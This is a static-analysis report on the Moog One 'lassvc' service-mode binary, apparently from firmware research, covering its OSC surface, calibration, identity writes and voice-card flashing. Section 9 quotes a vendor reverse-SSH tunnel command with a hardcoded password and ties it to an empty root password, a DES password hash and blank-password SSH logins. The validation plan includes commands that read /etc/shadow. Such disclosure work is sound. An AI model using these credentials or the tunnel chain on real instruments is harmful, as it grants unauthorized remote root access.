# `usr/bin/lassvc` — the Moog One service-mode tool

Definitive teardown of the 3.4 MB `usr/bin/lassvc` binary in the decrypted v1.8.2
rootfs. Static analysis only; the instrument was not contacted. Every load-bearing
claim is graded **[READ]** (quoted from a file, with offset/line), **[INFERRED]**
(reasoning, with the evidence named), or **[UNKNOWN]**.

Primary artifact:
`captures/firmware-1.8.2/rootfs-1.8.2/usr/bin/lassvc`
`ELF 32-bit LSB executable, ARM EABI5, dynamically linked, interp
/lib/ld-linux-armhf.so.3, stripped` **[READ]** (`file` output; ELF header).

Tools used: `strings -a -t x`, `xxd`, `md5`, `llvm-objdump -T/-p` at the path the
project pins. The binary was **never executed** (it is ARM; it would not run on
macOS regardless).

---

## 0. Headline

`lassvc` is the **factory service / calibration / bring-up console** for the Moog
One. It is a CHICKEN-Scheme, ncurses text UI that speaks **OSC over UDP** to the
voice controller (default `las.local:7770`) and to the panel (default
`las.local:9100`). It is **not started at boot**; it is reached only from physical
service mode (HOME+SETTINGS held at power-on) or run by hand.

Its most consequential feature is a menu item labelled **"phone home (alpha)"**
that starts a local SSH daemon and opens a **reverse SSH tunnel to
`remote.moogmusic.com`**, exposing the instrument's own `sshd` back to Moog. Chained
with `/etc/shadow` (root has an **empty** password) and `/etc/default/dropbear`
(`-B`, blank-password logins allowed), a completed phone-home gives a remote party
on that server an interactive **passwordless root shell** on the instrument. See §9.

It also holds the only in-band **voice-card firmware flasher** (`/fw/*`) and
**identity writers** (`/info/serial`, `/info/mac`, `/info/uuid`, `/info/write`,
`/info/protect`) found on the Linux side. See §7, §8.

---

## 1. Identity and provenance

| fact | value | grade / evidence |
|---|---|---|
| CHICKEN egg | `las-sc` | **[READ]** `usr/lib/chicken/8/lassvc.setup-info`: `(egg-name "las-sc")` — same egg as `las-sc`, `vxtune`, `vxmon`, `vxping`, `vxtest`. |
| Build path | `/home/las-ci-builds/glrt-t3_/0/moog/hardware/moog-one/las-buildroot/output/target/usr/bin/lassvc` | **[READ]** `lassvc.setup-info` `files` field. |
| Runtime | CHICKEN Scheme (compiled to C, then ARM); `libchicken.so.8` | **[READ]** `NEEDED libchicken.so.8` (`objdump -p`); dynamic syms are all `C_*` CHICKEN runtime entries. |
| Linked eggs (by string evidence) | `csosc` (OSC), `socket`, `udp6`, `gochan` (CSP channels), `ncurses`, `s11n` (serialize), `fmt` | **[READ]** strings `2a630a udp6`, `2a630f csosc`, `2a6315 ncurses`, `2d0a57 socket#sock/dgram`, `2def17 s11n#deserialize`, plus `gochan`/`fmt` symbols. |
| Size | 3,412,468 bytes | **[READ]** `ls -la`. |
| vs. v1.5.0 | **byte size identical**, MD5 **differs** (`e9e8c69b…` 1.5.0 vs `55316d3c…` 1.8.2) | **[READ]** `md5` of both. **[INFERRED]** recompiled (build path/timestamps changed) but functionally unchanged between 1.5.0 and 1.8.2 — the service tool was not revised across that span. |
| In arch-harvest set? | **No** | **[READ]** `ls captures/arch-harvest/` — not present. This is genuinely the first read of this binary on the project. |

The binary is **stripped** of its own function names, but as a CHICKEN build it
carries **two rich embedded tables**: (a) source `file:line` debug strings, and
(b) the CHICKEN literal-decode symbol table (`M(...)` closure signatures). Both are
plain text in `.rodata`. They are the backbone of everything below.

### 1.1 Internal module map (from embedded `file:line` strings) **[READ]**

Counting `*.scm:NN:` occurrences in the binary gives the source tree and its size:

| source file | string refs | max line seen | role (inferred from names) |
|---|---:|---:|---|
| `lassvc.scm` | 2291 | 3572 | main program: ncurses UI, menus, phone-home, dispatch |
| `cal/cal.scm` | 946 | 1857 | calibration routines |
| `las/las-measure.scm` | 360 | 1100 | oscillator/voltage measurement |
| `mon/vxmon-lib.scm` | 335 | 529 | voice-card monitor library (shared w/ vxmon) |
| `las/las-oscl.scm` | 264 | 820 | oscillator control structs (`Oscl_ctl_p`, `Oscl_report`) |
| `las/las-comm.scm` | 195 | 436 | OSC transport, `las-port`, clock (`LTRQ`/`LTRS`) |
| `cal/search.scm` | 157 | 546 | calibration search/convergence |
| `cal/vxtune-db.scm` | 121 | 293 | tuning database (`/var/tuning.vxtune`) |
| `vxfw-lib.scm` | 113 | 323 | **voice-card firmware flasher** |
| `las/las-math.scm` | 107 | 417 | curve fitting / interpolation |
| `cal/jobs.scm` | 100 | 265 | calibration job controller |
| `las/las-vox.scm` | 68 | 197 | per-voice model |
| `mon/table.scm` | 37 | 75 | table rendering |
| `las/sockutil.scm` | 16 | 43 | socket helpers |

These are compiled-in module names, not files on the rootfs — the `.scm` sources are
**not** shipped. **[READ]** the grep for `*.scm` line strings; **[INFERRED]** the
role column, from the closure names inside each.

---

## 2. Does it run at boot?  No.

**[READ]** `lassvc` appears in `etc/init.d/` **zero** times (grep of all of `etc/`).
`etc/inittab` starts only a serial `getty` (`console::respawn:/sbin/getty …`); no
service line launches it. It is reached by exactly two paths, both requiring
physical presence or a shell:

1. **Service mode at power-on.** `etc/init.d/S43gui` launches
   `/usr/bin/detect-held-buttons &` after the GUI is up. **[READ]**
   `usr/bin/detect-held-buttons` polls the front panel and, when button code `48`
   (HOME+SETTINGS) is held, kills `las-watchdog`, `las-frontend`, `las-sc`, `xterm`,
   then runs:
   `DISPLAY=:0 xterm … -hold -e 'lassvc -t vc:7770 -p vc:9100' &` **[READ]**.
2. **Factory tuning script.** `usr/bin/start_tune` runs
   `lassvc -t 203.0.113.2:7770 -p 203.0.113.2:9100` **[READ]** as its first
   interactive step (noise-floor calibration), before `vxtune auto-tune`.

So `lassvc` is a **hands-on tool**: it needs a controlling terminal (it is always
launched inside `xterm`) and it takes over the machine after the normal engine
(`las-sc`/`las-frontend`) has been killed. It is not a network-reachable daemon in
normal operation.

---

## 3. Invocation and command-line options

Long option names and defaults are embedded verbatim **[READ]** (offsets in
`.rodata`):

| short | long | default | string evidence |
|---|---|---|---|
| `-t` | `--vc-target` | `las.local:7770` | `2a36c5 vc-target`, `2a3520 las.local:7770`, `2a3684 *Target VC address (default las.local:7770)` |
| `-p` | `--panel-target` | `las.local:9100` | `2a366f panel-target`, `2a350c las.local:9100`, `2a3607 -Target Panel address (default las.local:9100)` |
| `-h` | `--help` | — | `2a3595 help`, `2a353d Display usage text`, `2a34f1 [options]` |
| — | `--no-vx` | — | `2a35e7 no-vx`, `2a35be No VX Cards Present in System.` |

Option parsing uses the CHICKEN `args`/`srfi-37` style (`2a3557 required`,
`2a359e optional`, `2a3565 requires an argument`, `2a3581 : option`) **[READ]**.
The two observed launch lines (§2) match: `-t <host:port>` = voice controller,
`-p <host:port>` = panel. `--no-vx` lets it run for panel-only work when no voice
cards answer.

---

## 4. Transport and protocol

**OSC over UDP.** **[READ]** `2d0a57 socket#sock/dgram`, `2d0155 socket#af/inet`,
`2a630f csosc`, `2a630a udp6`. The comm layer (`las/las-comm.scm`) defines a
`las-port` record wrapping a datagram socket and a reply channel
(`las-port-sock`, `las-port-sockaddr`, `las-port-cmd-chan`, `las-port-query-chan`,
`las-port-reply-chan`) **[READ]** (symbol table `2d08fb`…`2d5733`).

Connection handling **[READ]**:
- `lassvc-connect-to-socket` / `connect-to-socket*` (`2d0a33`, `2d0a69`).
- Liveness probe `/ping` (`2a3501`, `2d0679`); mode reset `/mode normal` (`2d06a9`,
  `2d06b4`); voice-count query `/v/voices` (`2d078a`).
- Retry loop with a poll interval of `0.25 s` (`2d06ce U0.25`, `2d0666
  poll-interval`) and messages `Exception on socket send:` (`2d06da`),
  `-- reconnect & retry` (`2d06fa`), `Unable to connect to socket after … tries`
  (`2d0714`,`2d073d`), `could not connect to` (`2d0640`).
- Clock query/response `LTRQ` / `LTRS` (`2d07eb`, `2d07e1`) with
  `las-clock-response` records (`2d0a94`…) carrying `tag`/`time` — matches the
  project's established reading that `LTRQ`/`LTRS` is the clock query/response pair.

Per-card / per-voice addressing uses a `/vx/` prefix with `card`, `voice`, `osc`
indices (`2d07f5 /vx/`, `2d07ff card`, `2d0805 voice`, `2d0845 osc=`) **[READ]**.

**[INFERRED]** `lassvc` is fundamentally a UDP **client**: it originates OSC to
VC:7770 and panel:9100 and reads replies on its own ephemeral socket. Evidence: the
default targets are remote `host:port` pairs, the connect/retry code, and the
absence of any "listen/accept" server-loop strings for the control plane. One
server-side thread does exist — `vxtune-db-server-thread` (`2decfe`) — belonging to
the shared `cal/vxtune-db.scm` module; its role inside `lassvc` specifically is
**[UNKNOWN]** (it may only be active in the sibling `vxtune` binary).

### 4.1 This is a DIFFERENT OSC namespace from `las-sc`'s `/p`

Every address `lassvc` speaks is under `/cal`, `/info`, `/fw`, `/hw`, `/mix`,
`/testosc`, `/a`, `/vx`, `/stat`, `/mode`, `/noise`, `/therm`, `/ping`, `/v` — a
**hardware bring-up plane on the voice controller**, wholly disjoint from the
~536-address `/p` performance namespace that `las-sc` owns. **[READ]** the extracted
address list; **[INFERRED]** the "hardware plane vs performance plane" split, from
the address content (raw DAC channels, filter cutoff calibration points, fan duty,
thermal, per-oscillator trim). Do not conflate these two namespaces.

---

## 5. The service menu

The UI is ncurses (`ncurses#KEY_UP/KEY_DOWN`, `A_REVERSE`, `COLOR_*`) driven by the
front-panel **encoder** and **soft-pots/soft-buttons** (`panel-state-softpot-vals`,
`-encoder-button`, `-soft-buttons`, `-last-encoder-press`) **[READ]**.

**Main menu** (`main-menu-modes`, `2a6057`) — banner
`moog one service mode - main menu - use encoder to select a routine`
(`2a2969`) **[READ]**. Items **[READ]** (`2a2324`+):
- `calibration` → the calibration submenu below
- `panel validation` (`2a2339`; also `panel knob validation` `2a1328`)
- `phone home (alpha)` (`2a2353`) — see §9

**Calibration submenu** (`cal-menu-modes`, `2a6048`) — banner
`moog one service mode - calibration menu - use encoder / arrow keys to select a
routine` (`2a2904`) **[READ]**. Items **[READ]** (`2a236f`+):

| menu label | offset | what it does (inferred) |
|---|---|---|
| `save cal data` | `2a236f` | commit calibration → `/cal/save`, `/cal:save`, `/info/save` |
| `cv out calibration` | `2a238a` | trims CV outputs; "connect cv out 1→cv in 1, cv out 2→cv in 2" |
| `cv in calibration` | `2a23a6` | trims CV inputs |
| `expression / sustain input calibration` | `2a23c0` | "cv out 1→expr in 1, cv out 2→expr in 2, cv out 3→sus in" |
| `main out calibration` | `2a23f1` | main L/R VCA trim; "main l→cv in 1, main r→cv in 2" |
| `headphone out calibration` | `2a240f` | headphone VCA trim; "hph l→cv in 1, hph r→cv in 2" |
| `panel calibration` | `2a2432` | 3-step panel-knob cal (ccw / center / cw) |
| `lhc calibration` | `2a244d` | 3-step left-hand-controller cal (glide / mod / pitch) |
| `noise source calibration` | `2a2466` | adjust noise until reading ≈ 1.0 |
| `serial number` | `2a248c` | **writes** `/info/serial` |
| `mac address` | `2a24a3` | **writes** `/info/mac` |
| `assign uuids` | `2a24b7` | **writes** `/info/uuid` (generates UUIDs, `make-uuid` `325da3`) |

Plus a `MANUAL FAN CONTROL` screen (`2a214d`) that drives `/hw/fan/` from the three
leftmost soft-pots and shows `VOLTAGES`, `FAN 1/2/3`, `DUTY CYCLES`, temperatures in
Celsius (`2a20a6`, `2a20b9`, `2a20d9`) **[READ]**.

"lhc" = left-hand controller: **[INFERRED]** from `/cal/lhck/glide`,
`/cal/lhck/mod`, `/cal/lhck/pitch` (`2a0bee`…`2a0cb7`) **[READ]** — glide, mod
wheel, pitch wheel.

---

## 6. OSC command surface (address inventory)

All **[READ]** from `.rodata`. Grouped; representative, not exhaustive of every
index.

**Identity / info (`/info/*`)** — read *and* write:
`/info/serial`, `/info/mac`, `/info/uuid`, `/info/product`, `/info/versionb`,
`/info/fwrev`, `/info/git`, `/info/save`, **`/info/write`**, **`/info/protect`**.
(`2a34a1`, `2a34ce`, `2a1067`, `3031dd`, `303232`, `2d0799`, `2d07aa`, `2a34b4`,
`2a1033`, `2a1044`.)

**Voice-card firmware (`/fw/*`)** — see §7:
`/fw/version`, `/fw/data`, `/fw/start`. (`3031c4`, `303121`, `303177`.)

**Hardware plane (`/hw/*`)**:
`/hw/mute`, `/hw/hpf`, `/hw/sus`, `/hw/autor`, `/hw/cvin0`, `/hw/cvin1`,
`/hw/expr0`, `/hw/expr1`, `/hw/fan/`. (`2a2ed1`, `2ea772`, `2a3277`, `2d7f96`,
`2a30ec`, `2a30b6`, `2a31e5`, `2a32c3`, `2a29b6`.)

**Calibration coefficients (`/cal/*`)** — a large tree of endpoints, each typically
carrying low/high/x fit points: oscillators `/cal/o1..o3/{l,h,x}`, pitch DACs
`/cal/p1..p3/{l,h,x}`, filters `/cal/ladf|ladr|svf1f|svf1r|svf2f|svf2r/x`,
`/cal/gsvf/x`, `/cal/gldr/{h,l,x}`, noise `/cal/noisecw|noiseccw/{l,h,x}`,
headphone `/cal/rk|lk` (+ `:cal_low|cal_mid|cal_high`), LHC
`/cal/lhck/{glide,mod,pitch}:cal_*`, main `/cal/mainl|mainr/x`, CV out
`/cal/cv/0..7/{x0,x1,y0,y1}`, CV in `/cal/cvin/{cvin0,cvin1,expr0,expr1,sus}/…`,
biases `/cal/biasfa`, `/cal/biasfb`, and `/cal/save`, `/cal/testosch`,
`/cal/testoscl`. (Offsets `2a0b11`–`2a0fa8`, `2a3484`–`2a3493`.)

**Test tone / raw DAC**: `/testosc/dac/0..7`, `/testosc/freq` (`2a0fbe`…`2a0ffa`,
`2e9f1a`, `2e9f81`) — direct DAC drive for measurement.

**Mixer trims used during cal**: `/mix/{o1,o2,o3,n,rm,ext}/{fa,fb}`,
`/mix/main-en`, `/mix/sub*-en` (`2a0dce`…`2a0eba`).

**Oscillator debug**: `/dbg/oscl_ctl`, `/o1|o2|o3/dbg/oscl_report`, `/o1/stat`
(`30551e`, `3054d3`…`305505`, `2a3401`) — carrying `Oscl_ctl_p`,
`Oscl_phase_report`, `Oscl_report`, `Vox_oscls_ctl_p` structs (`las/las-oscl.scm`).

**Analog status / metering**: `/a/stat/{0,1,cvin0,cvin1,mainl,mainr,send1,send2}`,
`/a/in1`, `/a/in2`, `/stat`, `/sstat`, `/statr`, `/stat/mix`, `/stat/decay`
(`2a2bc0`…, `2e9c6f`…).

**Misc**: `/mode` (`normal`), `/noise/mode`, `/therm/mode`, `/cenc` (encoder),
`/v/voices`, `/vx/`.

---

## 7. Voice-card firmware flasher (`vxfw-lib.scm`)

`lassvc` contains the only Linux-side path to **push firmware onto the voice cards**
over OSC. **[READ]** symbol table and strings (`33c76b`+, `303100`+):

- `vxfw-send-fw-cards ip cards fwfile` — top entry; message `Sending firmware to N
  cards` (`303186`, `303269`).
- `vxfw-send-fw card fwfile` → `vxfw-send-data` → `vxfw-send-block` /
  `vxfw-send-block-from-port` (`card adr ofs blob`), chunked by a `block-size`
  (`303111`). Wire verbs: **`/fw/start`** (begin, else `cannot start fw download`
  `303150`), **`/fw/data`** (blocks; `sent firmware to card` `303134`),
  **`/fw/version`** (`vxfw-read-fw-version`, `vxfw-get-card-version`,
  `vxfw-check-card`; `invalid firmware file` `30320b`, `version not available`
  `3031f0`).
- It also drives `/usr/bin/config-las-spi` (`3032e4`) and `set-power-state`
  (`3033b1`) — i.e. it can **power-cycle the XMOS over SPI** as part of a flash.

**[INFERRED]** this is how a technician re-flashes the XMOS voice controller /
voice-card DSP images (the `app_vx_*` / `app_las_*` `.bin` files that live in
`usr/share/xmosfw/`, referenced by `S42sc`), independent of the signed-rootfs update
path. Whether `lassvc`'s own menu exposes this, or it is reached only
programmatically / from `vxtest`, is **[UNKNOWN]** — no "firmware" menu label was
found among `main-menu-modes`/`cal-menu-modes`; the `/fw/*` verbs and `vxfw-*`
routines are compiled in and callable, but I did not locate a menu entry that calls
`vxfw-send-fw-cards`.

---

## 8. Write-capable / state-changing operations (the risk surface)

Distinct from read-only metering, these **mutate persistent hardware state**:

1. **Identity writes** — `/info/serial`, `/info/mac`, `/info/uuid`, and the generic
   `/info/write` + `/info/protect`. The menu has `serial number`, `mac address`,
   `assign uuids` (`get-serial`/`set-serial` `2a6221`/`2a622c`, `make-uuid`). **[READ]**
   for the endpoints and menu items; **[INFERRED]** that `/info/write` commits and
   `/info/protect` sets a write-protect/lock on the identity block (from the names).
   Consequence: a service session can rewrite the instrument's serial/MAC/UUIDs.
2. **Calibration overwrite** — `save cal data` → `/cal/save` + `/info/save` writes
   the full `/cal/*` coefficient set to the voice controller. A bad or interrupted
   cal run corrupts tuning/analog trim. This is exactly the class of "runs
   calibration/reset" side effect the project's own memory warns about for unknown
   Moog scripts.
3. **Firmware flash** — §7.
4. **Fan / thermal** — `MANUAL FAN CONTROL` drives `/hw/fan/` duty directly.
5. **Raw DAC / oscillator drive** — `/testosc/dac/*`, `/dbg/oscl_ctl` write hardware
   registers directly for measurement.

None of these are reachable without either service mode (physical button combo at
boot) or an interactive shell running `lassvc`.

---

## 9. The "phone home (alpha)" reverse-SSH backdoor  ← biggest finding

### 9.1 What the code contains — exact bytes

Three string literals assemble a shell script, with a **port number** spliced
between them (from the "select a port" menu). Verbatim from `xxd` of `.rodata`
(CHICKEN string-length prefix bytes `0x2c`='`,`', `0x50`='`P`' shown, then stripped)
**[READ]** at file offsets `0x2a10be`–`0x2a11c0`:

```
#!/bin/bash
 (sshpass -plas ssh -N -T -y -R <PORT>:localhost:22 -p4448 las@remote.moogmusic.com &) >> /var/log/phonehome.log 2>&1;
```
and, as separate literals used by start/stop/status:
```
start-stop-daemon -S -q -p /var/run/dropbear.pid --exec /usr/sbin/dropbear -- -R   # start local sshd
start-stop-daemon -K -q -p /var/run/dropbear.pid                                   # stop it
killall ssh            # tear down the tunnel
pidof dropbear         # status check
```

**[READ]** offsets: `2a10be ,#!/bin/bash`, `2a10cc  (sshpass -plas ssh -N -T -y -R`,
`2a10f0 P:localhost:22 -p4448 las@remote.moogmusic.com &) >> /var/log/phonehome.log
2>&1;`, `2a0b37 start-stop-daemon -K …`, `2a1157 start-stop-daemon -S … dropbear …
-R`, `2a1147 killall ssh`, `2a11ae pidof dropbear`. The leading `P` (`0x50`) and `,`
(`0x2c`) are CHICKEN literal **length bytes** (80 and 44), confirmed by cross-check
against `killall ssh` (len byte `0x0b`=11) and `test value: ` (`0x0c`=12) in the same
region — **not** part of the command text. The real second literal begins at the
colon: `:localhost:22 …`.

### 9.2 What it does

**[INFERRED]** from the reconstructed commands and standard `ssh`/`dropbear`/
`sshpass` semantics:

- Starts a **local SSH server** (`dropbear`) on the instrument.
- Runs an outbound SSH client to **`remote.moogmusic.com`, port 4448**, as user
  **`las`** with password **`las`** (`sshpass -plas`), `-N -T` (no shell, no PTY),
  `-y` (dropbear: auto-accept unknown host key).
- `-R <PORT>:localhost:22` sets a **remote port-forward**: it binds `<PORT>` on
  `remote.moogmusic.com` and forwards it back to `localhost:22` on the
  instrument — i.e. anyone who can reach `remote.moogmusic.com:<PORT>` is
  connected to the instrument's own `sshd`.
- `<PORT>` is chosen by the technician: menu `moog one phone home - select a port:`
  (`2a1991`), with a `phone-home-ports` list (`2a6028`) and `phone-home-h-portnum`
  field. UI states **[READ]**: `initializing…`, `launching daemon…`, `daemon
  running…`, `phone home successful!`, `not connected`, `failed to connect,
  aborted.`, `daemon failed to start, aborted.`, `daemon stopped - connection
  closed.` (`2a1956`…`2a190a`).
- Output is logged to `/var/log/phonehome.log`; that log is deleted on every boot
  by `etc/init.d/S14fs:70 rm -rf /var/log/phonehome*` **[READ]**.

### 9.3 Why it is dangerous — the full chain

The reverse tunnel exposes the instrument's `sshd`. What can be done once connected
is decided by the **instrument's own accounts**, and those are wide open **[READ]**:

- `etc/shadow`: `root::10933:0:99999:7:::` — **root has an empty password field**
  (nothing between the two colons). `etc/passwd`: `root:x:0:0:root:/root:/bin/sh`.
- `etc/shadow`: `las:bqMQnZNvDg8lE:20854:…` — user `las` (uid 1003, home `/root`,
  shell `/bin/sh`) has a **13-char traditional DES `crypt` hash** — an obsolete,
  trivially brute-forceable scheme. (I did **not** attempt to crack it. That the
  phone-home client authenticates to Moog's server as `las`/`las` is suggestive but
  the instrument-side `las` password is **[UNKNOWN]** — the hash is not the string
  "las"'s well-known value that I verified.)
- `etc/default/dropbear`: `DROPBEAR_ARGS="-B "` — dropbear **`-B` allows
  blank-password logins**. `etc/init.d/S50dropbear` also appends `-R` (create host
  keys as required).

**[INFERRED]**, chaining the above: a completed "phone home" lets a party who can
reach `remote.moogmusic.com:<PORT>` obtain an **interactive root shell with no
password** on the instrument (root empty password + dropbear `-B`). This is a
deliberate factory remote-support facility, not an exploit — but it is a genuine
remote-root exposure whenever it is activated.

### 9.4 Mitigating facts (do not overstate the threat)

- **Not automatic.** No cron entry, no init script, no autostart invokes phone-home.
  `etc/crontab/root` is the only cron line and runs `/etc/log-refresh` at 03:00
  **[READ]**; it does not touch phone-home. The feature fires only when a human
  selects it in service mode.
- **Physical gate.** Reaching `lassvc` at all needs HOME+SETTINGS held at power-on
  (or a shell). Reaching *this menu item* needs another deliberate selection.
- **Outbound + third-party dependent.** It requires the instrument to have working
  outbound Internet, DNS for `remote.moogmusic.com`, and that host to be listening
  on 4448 and to accept `las`/`las`. Whether that server still exists is
  **[UNKNOWN]** and cannot be determined from disk.
- **Labelled "alpha".** `phone home (alpha)` (`2a2353`) — an unfinished feature.
- Normal-operation `dropbear` itself is gated: `S50dropbear` only starts sshd when a
  magic USB key file `/media/thumbdrive/k` hexdumps to `23051934` **[READ]**
  (`S99final` uses the same key to keep xterms alive and skip the RO remount). But
  **phone-home starts its own dropbear regardless of that key**, so the USB gate does
  not protect against the phone-home path.

---

## 10. What lassvc would let someone do — summary

With a service-mode session (physical) or a shell that can run `lassvc`:

- Read live analog metering, temperatures, fan duty, oscillator phase/temp reports,
  voice count, firmware/git revision of the voice controller. (read-only)
- Run any factory calibration and **overwrite the stored `/cal/*` coefficients** and
  tuning — potentially detuning/miscalibrating the analog voices until re-run.
- **Rewrite instrument identity**: serial number, MAC, UUIDs, and set the
  `/info/protect` lock.
- **Flash voice-card firmware** over OSC (`/fw/*`, `vxfw-send-fw-cards`) and
  power-cycle the XMOS over SPI.
- Directly drive raw DACs / test oscillators and mixer/fan hardware.
- **Open a reverse-SSH tunnel to `remote.moogmusic.com`** that exposes the
  instrument's passwordless-root `sshd` to that server (§9).

It cannot touch the `/p` performance namespace, presets, the expression engine, or
MIDI — those belong to `las-sc`/`las-frontend`/XMOS, not to this tool.

---

## 11. Conflicts with existing docs

I did not edit any existing doc. Observations for the maintainers:

- **New material, no direct contradiction found.** `lassvc` appears in **no**
  existing `docs/arch/*.md` or `docs/*.md` (grep). `cal-dispatch.md` covers
  calibration but via `las-sc`'s `/cal` handling; this is a *second, independent*
  `/cal`-and-more surface living in a standalone service binary. The two should be
  cross-referenced so the calibration story is not assumed to be `las-sc`-only.
- **Namespace caution.** `CORRECTIONS-2026-09-08.md` and the architecture notes
  describe `las-sc`'s flat `/p` namespace (~536 addresses). `lassvc` speaks a
  *disjoint* `/cal /info /fw /hw /mix /testosc /a /vx …` plane. Any doc that says
  "the instrument's OSC namespace is /p" is incomplete: the hardware/service plane
  exists too, though only `lassvc`/`vxtune`/`vxtest` speak it and only in service
  contexts.
- **`LTRQ`/`LTRS`.** Consistent with the corrected reading (clock query/response),
  now independently confirmed inside `lassvc` (`las-clock-response`, `LTRQ`/`LTRS`).
- The empty-root-password + dropbear `-B` facts (§9.3) are read straight from
  `etc/shadow` / `etc/default/dropbear`; if any doc claims the instrument has no
  remote login exposure, that needs qualifying with the phone-home path.

---

## 12. Validation plan (READ-ONLY; a human runs these on the instrument)

None of these are needed to trust the static findings; they would *confirm* the
load-bearing ones. All are read-only and must be run by the owner, not by any agent.
Do not run `lassvc` itself — it takes over the machine and can write calibration.

1. Confirm identity/creds on the live unit (read files, change nothing):
   `cat /etc/shadow; cat /etc/passwd; cat /etc/default/dropbear`
   → expect `root::…` (empty pw), `las:bqMQnZNvDg8lE:…`, `DROPBEAR_ARGS="-B "`.
2. Confirm it is not running and not autostarted:
   `pidof lassvc; grep -rn lassvc /etc/init.d /etc/inittab`
   → expect no PID and no init reference.
3. Confirm the phone-home strings in the on-device binary match this report:
   `strings -a /usr/bin/lassvc | grep -nE 'remote.moogmusic.com|sshpass|phonehome|-p4448'`
4. Confirm DNS/reachability of the callback host *without connecting to SSH*:
   `getent hosts remote.moogmusic.com` (name resolution only). Do **not** `ssh` to it.
5. Confirm the boot-time log wipe:
   `grep -n phonehome /etc/init.d/S14fs`  and  `ls -la /var/log/phonehome* 2>/dev/null`.
6. Confirm the OSC targets a technician would use are the VC and panel:
   inspect `/usr/bin/detect-held-buttons` and `/usr/bin/start_tune` on the unit
   (already read from the rootfs here).

---

## 13. Unexplored

- **No disassembly of control flow.** All findings are from the embedded string and
  CHICKEN symbol tables, not from tracing ARM instructions. The *existence* of every
  routine/endpoint named here is solid; the exact *conditions and order* in which
  `lassvc` issues them (e.g. does a given menu item write `/info/protect`? what is a
  cal run's precise OSC sequence?) were not traced through `llvm-objdump -d`.
- **Firmware-flash reachability.** `vxfw-send-fw-cards` and `/fw/*` are compiled in,
  but I did not find the menu label that invokes them (§7). Whether the flasher is
  reachable from `lassvc`'s own UI or only from `vxtest`/programmatically is open.
- **`vxtune-db-server-thread` in `lassvc`.** Present via the shared module; its
  active role (if any) inside `lassvc` specifically is unconfirmed.
- **The `las` account password.** Only the DES hash was read; not cracked. The
  phone-home *client* password to Moog's server is `las`; the instrument-side `las`
  login password is not established here.
- **`phone-home-ports` values.** The selectable port list exists as a symbol; the
  concrete integer values in that list were not extracted (they are built in code,
  not stored as obvious literals near the label).
- **`remote.moogmusic.com:4448` liveness.** Cannot be known from disk; deliberately
  not probed.
- **Sibling service binaries.** `vxtune`, `vxtest`, `vxmon`, `vxping`, `vxreport`,
  `oscterm`, `osclog` share the `las-sc`/`oscterm` eggs and this OSC plane; they were
  not torn down here. `vxtest` (2.5 MB) in particular likely also carries `vxfw`.
